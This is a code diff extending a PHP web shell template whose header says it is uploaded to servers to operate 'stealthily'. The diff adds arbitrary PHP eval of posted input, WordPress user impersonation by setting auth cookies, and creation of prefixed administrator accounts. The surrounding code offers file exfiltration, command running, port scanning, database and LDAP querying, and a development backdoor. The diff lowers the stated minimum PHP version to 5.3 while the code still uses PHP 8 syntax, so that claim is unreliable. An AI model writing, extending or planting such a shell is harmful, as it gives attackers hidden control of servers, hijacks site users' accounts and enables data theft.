@@ -2,9 +2,9 @@
 /*
  * Version: 1.0.0
  * Build: 2024-04-13
- * Last change: 2024-04-13
+ * Last change: 2024-05-01
  * Author: @Ebalo <https://github.com/ebalo55>
- * Minimum PHP version: 8.0
+ * Minimum PHP version: 5.3
  * Description:
  * This template is used to generate a PHP script that can be used to perform various operations, stealthily, on a server.
  * The idea is to have a single PHP file that can be uploaded to a server and then accessed to perform various operations.
@@ -26,7 +26,9 @@ $WRITE_FILE              = "__FEAT_WRITE_FILE__";
 $RUN_COMMAND             = "__FEAT_RUN_COMMAND__";
 $PHP_INFO                = "__FEAT_PHP_INFO__";
 $QUERY_DATABASES         = "__FEAT_QUERY_DATABASES__";
-$QUERY_LDAP = "__FEAT_QUERY_LDAP__";
+$QUERY_LDAP              = "__FEAT_QUERY_LDAP__";
+$EVAL                    = "__FEAT_EVAL__";
+$IMPERSONATE_WP_USER     = "__FEAT_IMPERSONATE_WP_USER__";
 
 $USERNAME = "__USERNAME__";
 $PASSWORD = "__PASSWORD__";
@@ -71,7 +73,7 @@ $ENABLED_FEATURES = [
         "title"       => "Port scan",
         "description" => "Scan a given range of TCP ports using connect method.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
-  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
+  <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m0-10.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.75c0 5.592 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.57-.598-3.75h-.152c-3.196 0-6.1-1.25-8.25-3.286Zm0 13.036h.008v.008H12v-.008Z" />
 </svg>',
     ],
     $WRITE_FILE              => [
@@ -102,14 +104,32 @@ $ENABLED_FEATURES = [
   <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125" />
 </svg>',
     ],
-    $QUERY_LDAP => [
-        "title" => "Query LDAP",
+    $QUERY_LDAP              => [
+        "title"       => "Query LDAP",
         "description" => "Query LDAP using the provided credentials.",
-        "svg" => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 21h16.5M4.5 3h15M5.25 3v18m13.5-18v18M9 6.75h1.5m-1.5 3h1.5m-1.5 3h1.5m3-6H15m-1.5 3H15m-1.5 3H15M9 21v-3.375c0-.621.504-1.125 1.125-1.125h3.75c.621 0 1.125.504 1.125 1.125V21" />
 </svg>',
     ],
+    $EVAL                    => [
+        "title"       => "Eval PHP",
+        "description" => "Evaluate PHP code.",
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
+</svg>',
+    ],
 ];
+
+// Enable WordPress specific features
+if (defined("__WP__") && __WP__) {
+    $ENABLED_FEATURES[$IMPERSONATE_WP_USER] = [
+        "title"       => "Impersonate WP user",
+        "description" => "Impersonate a WordPress user by changing the current session.",
+        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
+</svg>',
+    ];
+}
 
 date_default_timezone_set("UTC");
 
@@ -120,9 +140,19 @@ $CSS = '__CSS__';
 ////////////////////////
 
 /**
- * Check if the request method is POST
+ * Array column function for PHP < 5.5
  *
- * @return bool
+ * @param $array array Array to extract the column from
+ * @param $column_name string Column name to extract
+ *
+ * @return array Extracted column
+ */
+function _array_column($array, $column_name): array {
+    return array_map(fn($element) => $element[$column_name], $array);
+}
+
+/**
+ * Check if the request method is POST
  */
 function isPost(): bool {
     return $_SERVER['REQUEST_METHOD'] === 'POST';
@@ -132,26 +162,21 @@ function isPost(): bool {
  * Check if the checkbox is active
  *
  * @param $name string Name of the checkbox
- *
- * @return bool
  */
-function isCheckboxActive(string $name): bool {
+function isCheckboxActive($name): bool {
     return isset($_POST[$name]) && $_POST[$name] === "y";
 }
 
 ///////////////////////
 /// RENDERING BLOCK ///
 ///////////////////////
-
 /**
  * Returns the classes to apply to the navigation item highlighted because it's the current page
  *
  * @param $current_page string Current page
  * @param $checking_page string Page to check if it's the current page
- *
- * @return string
  */
-function htmlHighlightActivePage(string $current_page, string $checking_page): string {
+function htmlHighlightActivePage($current_page, $checking_page): string {
     if ($current_page === $checking_page) {
         return "bg-zinc-800 text-white";
     }
@@ -167,7 +192,7 @@ function htmlHighlightActivePage(string $current_page, string $checking_page): s
  *
  * @return string
  */
-function makeNavLink(string $page, string $current_page, array $definition): string {
+function makeNavLink($page, $current_page, array $definition): string | false {
     if ($definition["hidden"]) {
         return "";
     }
@@ -199,7 +224,7 @@ function makeNavLink(string $page, string $current_page, array $definition): str
  *
  * @return string
  */
-function makePageHeader(string $title, string $description): string {
+function makePageHeader($title, $description): string | false {
     ob_start();
     ?>
     <div class="lg:flex lg:items-center lg:justify-between">
@@ -233,23 +258,24 @@ function makePageHeader(string $title, string $description): string {
  * @param $placeholder string Placeholder for the input
  * @param $description string Description of the input
  * @param $required bool Whether is the input required
- * @param $query_param string|null Query parameter to use as the value of the input
  *
  * @return string
  */
 function makeInput(
-    string        $type,
-    string        $label,
-    string        $name,
-    string        $placeholder,
-    string        $description,
-    bool          $required = false,
-    string | null $query_param = null,
-): string {
+    $type,
+    $label,
+    $name,
+    $placeholder,
+    $description,
+    $required = false,
+    $query_param = null,
+    $value = null,
+): string | false {
     ob_start();
     if ($type !== "textarea") {
         ?>
-        <div class="flex flex-col gap-y-2" id="<?php echo $name ?>-container">
+        <div class="flex flex-col gap-y-2 <?php echo $type === "hidden" ? "hidden" : ""; ?>"
+             id="<?php echo $name ?>-container">
             <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                 <?php echo $label ?>
                 <?php
@@ -268,6 +294,9 @@ function makeInput(
                 }
                 if ($query_param !== null) {
                     echo "value=\"" . $_GET[$query_param] . "\" ";
+                }
+                if ($value !== null) {
+                    echo "value=\"" . htmlspecialchars($value) . "\" ";
                 }
                 ?>
                    class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400">
@@ -298,7 +327,11 @@ function makeInput(
                 ?>
                       class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400"
                       rows="5"
-            ></textarea>
+            ><?php
+                if (!empty($value)) {
+                    echo htmlspecialchars($value);
+                }
+                ?></textarea>
             <p class="text-sm text-zinc-500">
                 <?php echo $description ?>
             </p>
@@ -319,13 +352,7 @@ function makeInput(
  *
  * @return string
  */
-function makeSelect(
-    string        $label,
-    string        $name,
-    array         $options,
-    bool          $required = false,
-    string | null $disable_reason = null,
-): string {
+function makeSelect($label, $name, $options, $required = false, $disable_reason = null): string | false {
     ob_start();
     ?>
     <div id="<?php echo $name ?>-container">
@@ -377,14 +404,7 @@ function makeSelect(
  *
  * @return string
  */
-function makeCheckbox(
-    string        $name,
-    string        $label,
-    string        $description,
-    bool          $is_checked = false,
-    string        $value = "y",
-    string | null $onclick = null,
-): string {
+function makeCheckbox($name, $label, $description, $is_checked = false, $value = "y", $onclick = null): string | false {
     ob_start();
     ?>
     <div class="relative flex items-start" id="<?php echo $name ?>-container">
@@ -425,10 +445,18 @@ function makeCheckbox(
  *
  * @return string
  */
-function makeForm(string $operation, string $action, array $elements, string $method = "post"): string {
+function makeForm(
+    $operation,
+    $action,
+    $elements,
+    $method = "post",
+    $submit_label = "Run operation",
+    $classes = "flex flex-col gap-y-6 max-w-xl mt-8",
+): string | false {
     ob_start();
     ?>
-    <form action="<?php echo $action ?>" method="<?php echo $method ?>" class="flex flex-col gap-y-6 max-w-xl mt-8">
+    <form action="<?php echo $action ?>" method="<?php echo $method ?>"
+          class="<?php echo htmlspecialchars($classes) ?>">
         <input type="hidden" name="__OPERATION__" value="<?php echo $operation ?>"/>
         <?php
         foreach ($elements as $element) {
@@ -438,7 +466,7 @@ function makeForm(string $operation, string $action, array $elements, string $me
         <button type="submit"
                 class="rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
     hover:bg-zinc-700 transition-all duration-300">
-            Run operation
+            <?php echo $submit_label ?>
         </button>
     </form>
     <?php
@@ -453,7 +481,7 @@ function makeForm(string $operation, string $action, array $elements, string $me
  *
  * @return string
  */
-function makePage(array $elements, string $current_page): string {
+function makePage($elements, $current_page): string | false {
     global $ENABLED_FEATURES, $CSS, $LOGIN;
     if ($_SESSION["auth"] !== true) {
         header("Location: ?page=" . $LOGIN);
@@ -510,7 +538,7 @@ function makePage(array $elements, string $current_page): string {
  *
  * @return string
  */
-function makeLoginPage(): string {
+function makeLoginPage(): string | false {
     global $CSS, $LOGIN;
     ob_start();
     ?>
@@ -586,7 +614,7 @@ function makeLoginPage(): string {
  *
  * @return string
  */
-function makeCodeHighlight(float | int | string $code): string {
+function makeCodeHighlight($code): string | false {
     ob_start();
     ?>
     <code class="font-mono bg-zinc-100 text-zinc-900 text-sm px-2 py-1 rounded mx-1 select-all"><?php echo $code ?></code>
@@ -602,7 +630,7 @@ function makeCodeHighlight(float | int | string $code): string {
  *
  * @return string
  */
-function makeAlert(string $title, string $message): string {
+function makeAlert($title, $message): string | false {
     ob_start();
     ?>
     <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 rounded mt-4 text-zinc-900 flex gap-x-4">
@@ -627,19 +655,87 @@ function makeAlert(string $title, string $message): string {
 }
 
 /**
+ * Create a table element on the page
+ *
+ * @param $title string Title of the table
+ * @param $description string Description of the table
+ * @param $rows array[] Rows to display in the table
+ * @param $columns string[]|null Columns to display in the table
+ *
+ * @return string
+ */
+function makeTable($title, $description, $rows, $columns = null, $action_form = null): string | false {
+    $columns = $columns ?: array_keys($rows[0]);
+    ob_start();
+    ?>
+    <div class="px-4 sm:px-6 lg:px-8 mt-8">
+        <div class="sm:flex sm:items-center">
+            <div class="sm:flex-auto">
+                <h1 class="text-base font-semibold leading-6 text-gray-900"><?php echo $title; ?></h1>
+                <p class="mt-2 text-sm text-gray-700"><?php echo $description; ?></p>
+            </div>
+            <div class="mt-4 sm:ml-16 sm:mt-0 sm:flex-none">
+                <?php
+                if ($action_form !== null) {
+                    echo $action_form;
+                }
+                ?>
+            </div>
+        </div>
+        <div class="mt-8 flow-root">
+            <div class="-mx-4 -my-2 overflow-x-auto sm:-mx-6 lg:-mx-8">
+                <div class="inline-block min-w-full py-2 align-middle sm:px-6 lg:px-8">
+                    <div class="overflow-hidden shadow ring-1 ring-black ring-opacity-5 sm:rounded-lg">
+                        <table class="min-w-full divide-y divide-gray-300">
+                            <thead class="bg-gray-50">
+                            <tr>
+                                <?php
+                                foreach ($columns as $column) {
+                                    echo "<th scope='col' class='px-3 py-3.5 text-left text-sm font-semibold text-gray-900'>$column</th>";
+                                }
+                                ?>
+                            </tr>
+                            </thead>
+                            <tbody class="divide-y divide-gray-200 bg-white">
+                            <?php
+                            foreach ($rows as $row) {
+                                echo "<tr>";
+                                foreach ($columns as $key => $column) {
+                                    if (is_array($row[$key])) {
+                                        echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>" .
+                                             implode(", ", $row[$key]) .
+                                             "</td>";
+                                    }
+                                    else {
+                                        echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>$row[$key]</td>";
+                                    }
+                                }
+                                echo "</tr>";
+                            }
+                            ?>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <?php
+    return ob_get_clean();
+}
+
+/**
  * Open the command output screen where output can be freely written
  *
  * @param string $classes Classes to apply to the command output screen
  * @param string $title Title of the command output screen
  * @param bool $no_margin Whether to remove the margin from the command output screen
  * @param bool $no_padding Whether to remove the padding from the command output screen
- *
- * @return void
  */
-function openCommandOutputScreen(string $classes = "",
-                                 string $title = "Command output",
-                                 bool   $no_margin = false,
-                                 bool   $no_padding = false):void
+function openCommandOutputScreen($classes = "",
+                                 $title = "Command output",
+                                 $no_margin = false,
+                                 $no_padding = false): void
 {
     ?>
 <div class="<?php
@@ -656,8 +752,6 @@ echo $no_padding ? "" : "py-10 ";
 
 /**
  * Closes the command output screen
- *
- * @return void
  */
 function closeCommandOutputScreen(): void {
     ?></pre>
@@ -671,10 +765,8 @@ function closeCommandOutputScreen(): void {
  * Output data to the command output screen
  *
  * @param array|string $data Data to output
- *
- * @return void
  */
-function out(array | string $data): void {
+function out($data): void {
     if (is_array($data)) {
         $data = implode("\n", $data);
     }
@@ -685,17 +777,14 @@ function out(array | string $data): void {
 ///////////////////////
 // CODE BLOCK START  //
 ///////////////////////
-
 /**
  * Download a file in chunks
  *
  * @param $filepath string Path to the file to download
  * @param $filesize int Size of the file
  * @param $filename string|null Name of the file to download or null to use the original filename
- *
- * @return void
  */
-function chunkedDownload(string $filepath, int $filesize, string | null $filename = null): void {
+function chunkedDownload($filepath, string $filesize, $filename = null): void {
     $chunk_size = 4096; // Adjust chunk size as needed
 
     header('Content-Description: File Transfer');
@@ -719,8 +808,6 @@ function chunkedDownload(string $filepath, int $filesize, string | null $filenam
 
 /**
  * Handle the file extraction operation
- *
- * @return void
  */
 function handleFileExtraction(): void {
     $filepath = $_POST['__PARAM_1__'];
@@ -755,8 +842,6 @@ function handleFileExtraction(): void {
 
 /**
  * Handle the directory listing operation
- *
- * @return void
  */
 function handleDirectoryListing(): void {
     $path      = $_POST['__PARAM_1__'];
@@ -772,10 +857,8 @@ function handleDirectoryListing(): void {
  * @param $max_depth int Maximum depth to list
  * @param $depth int Current depth
  * @param $show_line_split bool Whether to show a line split between entries
- *
- * @return void
  */
-function listFilesRecursive(string $path, int $max_depth, int $depth = 0, bool $show_line_split = true): void {
+function listFilesRecursive($path, $max_depth, $depth = 0, $show_line_split = true): void {
     if (is_string($max_depth) && strtolower($max_depth) === "inf") {
         $max_depth = INF;
     }
@@ -818,7 +901,7 @@ function listFilesRecursive(string $path, int $max_depth, int $depth = 0, bool $
  *
  * @return array
  */
-function getStatForCurrentPath(string $path): array {
+function getStatForCurrentPath($path) {
     $stat = stat($path);
 
     // Print information for current path
@@ -842,10 +925,8 @@ function getStatForCurrentPath(string $path): array {
  * Get the permissions string for a file or directory (unix like `ls -l` output)
  *
  * @param $path string Path to get permissions for
- *
- * @return string
  */
-function getPermissionsString(string $path): string {
+function getPermissionsString($path): string {
     if (!file_exists($path)) {
         return "----------";
     }
@@ -887,9 +968,9 @@ function getPermissionsString(string $path): string {
  *
  * @return string
  */
-function pad_right(string $str, int $pad_length = 10): string {
+function pad_right($str, $pad_length = 10) {
     // Ensure string and pad length are valid
-    if ($pad_length <= 0) {
+    if (!is_string($str) || !is_int($pad_length) || $pad_length <= 0) {
         return $str; // Return unmodified string for invalid input
     }
 
@@ -904,7 +985,7 @@ function pad_right(string $str, int $pad_length = 10): string {
  *
  * @return string
  */
-function formatBytes(array | int | float $bytes): string {
+function formatBytes($bytes) {
     $units = ['B', 'KB', 'MB', 'GB', 'TB'];
 
     $bytes = max($bytes, 0);
@@ -922,21 +1003,17 @@ function formatBytes(array | int | float $bytes): string {
  * Convert a Unix timestamp to a date string
  *
  * @param $timestamp int Unix timestamp
- *
- * @return string
  */
-function convertUnixTimestampToDate(int $timestamp): string {
-    return date('Y-m-d H:i:s', $timestamp) ?: "Invalid date";
+function convertUnixTimestampToDate($timestamp): string {
+    return date('Y-m-d H:i:s', $timestamp);
 }
 
 /**
  * Get the shortest common path from a list of paths
  *
  * @param $paths string[] List of paths
- *
- * @return string|null
  */
-function getShortestCommonPath(array $paths): ?string {
+function getShortestCommonPath($paths): ?string {
     if (empty($paths)) {
         return null;
     }
@@ -966,8 +1043,6 @@ function getShortestCommonPath(array $paths): ?string {
 
 /**
  * Handle the zip creation process
- *
- * @return void
  */
 function handleCreateZip(): void {
     $content = $_POST['__PARAM_1__'];
@@ -1048,16 +1123,8 @@ function handleCreateZip(): void {
  * @param $recursive bool Whether to add the directory recursively
  * @param $extensions string[] Extensions to include
  * @param $cleanup_path string Path to cleanup
- *
- * @return void
  */
-function addDirectoryToZip(
-    string     $dir,
-    ZipArchive $zip,
-    bool       $recursive,
-    array      $extensions,
-    string     $cleanup_path = "",
-): void {
+function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = ""): void {
     $dir_handle = opendir($dir);
 
     while (($file = readdir($dir_handle)) !== false) {
@@ -1094,8 +1161,6 @@ function addDirectoryToZip(
 
 /**
  * Handle the port scan operation
- *
- * @return void
  */
 function handlePortScan(): void {
     $host      = $_POST['__PARAM_1__'];
@@ -1125,8 +1190,6 @@ function handlePortScan(): void {
 
 /**
  * Handle the write file operation
- *
- * @return void
  */
 function handleWriteFile(): void {
     $filename               = $_POST['__PARAM_1__'];
@@ -1143,8 +1206,6 @@ function handleWriteFile(): void {
 
 /**
  * Handle the login operation
- *
- * @return void
  */
 function handleLogin(): void {
     global $SALT, $PASSWORD, $USERNAME, $FILE_EXTRACTION;
@@ -1162,7 +1223,7 @@ function handleLogin(): void {
  *
  * @return string
  */
-function makeExfiltratePage(): string {
+function makeExfiltratePage() {
     global $EXFILTRATE, $ENABLED_FEATURES;
     return makePage(
         [
@@ -1198,7 +1259,7 @@ function makeExfiltratePage(): string {
  *
  * @return string
  */
-function listEnabledExtensions(): string {
+function listEnabledExtensions(): string | false {
     $extensions = get_loaded_extensions();
     ob_start();
     openCommandOutputScreen("max-h-96 overflow-y-scroll mb-8", "Enabled extensions", true, true);
@@ -1214,10 +1275,8 @@ function listEnabledExtensions(): string {
  *
  * @param $pdo PDO PDO connection to use
  * @param $query string Query to run
- *
- * @return void
  */
-function runPDOQuery(PDO $pdo, string $query): void {
+function runPDOQuery($pdo, $query): void {
     $stmt = $pdo->query($query);
     if ($stmt) {
         $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
@@ -1238,17 +1297,15 @@ function runPDOQuery(PDO $pdo, string $query): void {
  * Print an ASCII table from the given data
  *
  * @param $data array[] Data to print
- *
- * @return void
  */
-function printAsciiTable(array $data): void {
+function printAsciiTable($data): void {
     // Get column headers
     $headers = array_keys($data[0]);
 
     // Calculate column widths
     $columnWidths = [];
     foreach ($headers as $header) {
-        $columnWidths[$header] = max(array_map('strlen', array_column($data, $header))) + 2;
+        $columnWidths[$header] = max(array_map('strlen', _array_column($data, $header))) + 2;
     }
 
     // Print top row
@@ -1314,34 +1371,28 @@ function printAsciiTable(array $data): void {
  * @param $raw_connection_string string Raw connection string to use for connection
  * @param $query string|null Query to run
  * @param $collection string|null Collection to use for connection
- *
- * @return void
  */
 function connectAndQueryDatabase(
-    string  $db_type,
-    string  $username,
-    string  $password,
-    string  $host = 'localhost',
-    ?int    $port = null,
-    ?string $service_name = null,
-    ?string $sid = null,
-    ?string $database = null,
-    ?string $charset = null,
-    ?string $options = null,
-    ?string $role = null,
-    ?string $dialect = null,
-    ?string $odbc_driver = null,
-    ?string $server = null,
-    ?string $protocol = null,
-    ?string $enableScrollableCursors = null,
-    string  $raw_connection_string = "",
-    ?string $query = null,
-    ?string $collection = null,
+    $db_type,
+    $username,
+    $password,
+    string $host = 'localhost',
+    $port = null,
+    $service_name = null,
+    $sid = null,
+    $database = null,
+    $charset = null,
+    $options = null,
+    $role = null,
+    $dialect = null,
+    $odbc_driver = null,
+    $server = null,
+    $protocol = "onsoctcp",
+    $enableScrollableCursors = null,
+    $raw_connection_string = "",
+    $query = null,
+    $collection = null,
 ): void {
-    if (empty($protocol)) {
-        $protocol = "onsoctcp";
-    }
-
     if ($db_type === 'mysql') {
         $port = $port ?: 3306;
 
@@ -1962,10 +2013,8 @@ function connectAndQueryDatabase(
 
 /**
  * Handle the query database operation
- *
- * @return void
  */
-function handleQueryDatabase() {
+function handleQueryDatabase(): void {
     connectAndQueryDatabase(
         $_POST["__PARAM_1__"],
         $_POST["__PARAM_4__"],
@@ -1996,16 +2045,8 @@ function handleQueryDatabase() {
  * @param $password string|null LDAP password
  * @param $domain string LDAP domain
  * @param $query string LDAP query
- *
- * @return void
  */
-function runLDAPQuery(string  $server,
-                      ?int    $port,
-                      ?string $username,
-                      ?string $password,
-                      string  $domain,
-                      string  $query,
-): void {
+function runLDAPQuery($server, $port, $username, $password, $domain, $query): void {
     $port = $port ?: 389;
 
     // Connect to LDAP server
@@ -2060,10 +2101,87 @@ function runLDAPQuery(string  $server,
     }
 
     echo "Query executed successfully (Query: $query).\n";
-    echo json_encode($ldap_entries, JSON_PRETTY_PRINT);
+    echo json_encode($ldap_entries);
 
     // Close LDAP connection
     ldap_unbind($ldap_conn);
+}
+
+/**
+ * Get the list of WordPress users
+ *
+ * @return array List of WordPress users
+ */
+function getWPUsers(): array {
+    return array_map(
+        function ($data): array {
+            global $IMPERSONATE_WP_USER;
+            return array_merge(
+                (array) $data->data,
+                [
+                    "roles"   => $data->roles,
+                    "actions" => makeForm(
+                        $IMPERSONATE_WP_USER,
+                        $_SERVER["REQUEST_URI"],
+                        [
+                            makeInput(
+                                "hidden",
+                                "__PARAM_1__",
+                                "username",
+                                "",
+                                "Username of the user to impersonate.",
+                                true,
+                                null,
+                                $data->data->user_login,
+                            ),
+                        ],
+                        "post",
+                        "Impersonate",
+                        "flex flex-col max-w-xl mb-0",
+                    ),
+                ],
+            );
+        },
+        get_users(),
+    );
+}
+
+/**
+ * Handle the impersonate WordPress user operation and user creation operation
+ */
+function handleImpersonateWPUser(): void {
+    // Run the impersonate operation
+    if (isset($_POST["__PARAM_1__"]) && !empty($_POST["__PARAM_1__"])) {
+        $user = get_user_by("login", $_POST["__PARAM_1__"]);
+        if ($user) {
+            wp_set_current_user($user->ID, $user->user_login);
+            wp_set_auth_cookie($user->ID);
+            wp_redirect(site_url());
+            exit;
+        }
+    }
+    // Run the user creation operation
+    elseif (isset($_POST["__PARAM_2__"]) &&
+            !empty($_POST["__PARAM_2__"]) &&
+            isset($_POST["__PARAM_3__"]) &&
+            !empty($_POST["__PARAM_3__"])) {
+        $user_id = wp_insert_user(
+            [
+                "user_login" => "__PREFIX__" . $_POST["__PARAM_2__"],
+                "user_pass"  => $_POST["__PARAM_3__"],
+                "role"       => "administrator",
+            ],
+        );
+        if (!is_wp_error($user_id)) {
+            $user = get_user_by("id", $user_id);
+            if ($user) {
+                wp_set_current_user($user->ID, $user->user_login);
+                wp_set_auth_cookie($user->ID);
+                wp_redirect(site_url());
+                exit;
+            }
+        }
+    }
 }
 
 // TEMPLATE DEVELOPMENT BACKDOOR - START
@@ -2076,7 +2194,7 @@ if (isset($_GET["dev"])) {
 
 // Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
 // on the page except the operation result.
-$isolated_ops = [$FILE_EXTRACTION, $EXFILTRATE, $LOGIN];
+$isolated_ops = [$FILE_EXTRACTION, $EXFILTRATE, $LOGIN, $IMPERSONATE_WP_USER];
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page
 if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
@@ -2678,6 +2796,96 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                 $page,
             );
             break;
+        case $EVAL:
+            $content = makePage(
+                [
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"],
+                    ),
+                    makeForm(
+                        $page,
+                        $_SERVER["REQUEST_URI"],
+                        [
+                            makeInput(
+                                "textarea",
+                                "PHP code",
+                                "__PARAM_1__",
+                                "echo 'Hello, world!';",
+                                "The PHP code to evaluate.",
+                                true,
+                            ),
+                        ],
+                    ),
+                ],
+                $page,
+            );
+            break;
+        case $IMPERSONATE_WP_USER:
+            $users   = getWPUsers();
+            $content = makePage(
+                [
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"],
+                    ),
+                    makeTable(
+                        "Users",
+                        "WordPress users to impersonate",
+                        $users,
+                        [
+                            "user_login" => "Username",
+                            "user_email" => "Email",
+                            "roles"      => "Roles",
+                            "user_url"   => "URL",
+                            "actions"    => "Actions",
+                        ],
+                        "
+                        <dialog id='create-wp-user' class='p-4 rounded w-1/3'>" .
+                        makeForm(
+                            $page,
+                            $_SERVER["REQUEST_URI"],
+                            [
+                                "<div class='flex items-center justify-between'>
+                                        <h3 class='text-lg font-semibold text-zinc-800'>Create WordPress user</h3>
+                                        <button onclick='document.getElementById(\"create-wp-user\").close(); document.getElementById(\"create-wp-user\").classList.remove(\"flex\")' 
+                                            class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
+                                            &times;
+                                        </button>
+                                    </div>",
+                                makeInput(
+                                    "text",
+                                    "Username",
+                                    "__PARAM_2__",
+                                    "admin",
+                                    "Username of the user to create.",
+                                    true,
+                                ),
+                                makeInput(
+                                    "password",
+                                    "Password",
+                                    "__PARAM_3__",
+                                    "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
+                                    "Password of the user to create.",
+                                    true,
+                                ),
+                            ],
+                            "post",
+                            "Create user",
+                            "flex flex-col gap-y-6 mx-auto w-full",
+                        )
+                        . "
+                        </dialog>
+                        <button onclick='document.getElementById(\"create-wp-user\").showModal()' 
+                            class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
+                                hover:bg-zinc-700 transition-all duration-300'>
+                            Create user
+                        </button>",
+                    ),
+                ],
+                $page,
+            );
+            break;
     }
 
     echo $content;
@@ -2726,6 +2934,12 @@ if (isPost()) {
                 $_POST["__PARAM_6__"],
             );
             break;
+        case $EVAL:
+            eval($_POST["__PARAM_1__"]);
+            break;
+        case $IMPERSONATE_WP_USER:
+            handleImpersonateWPUser();
+            break;
         default:
             echo "Unrecognized operation '$operation'";
             break;
@@ -2738,4 +2952,3 @@ if (!isPost() &&
     $_POST["__OPERATION__"] !== $LOGIN) {
     closeCommandOutputScreen();
 }
-?>
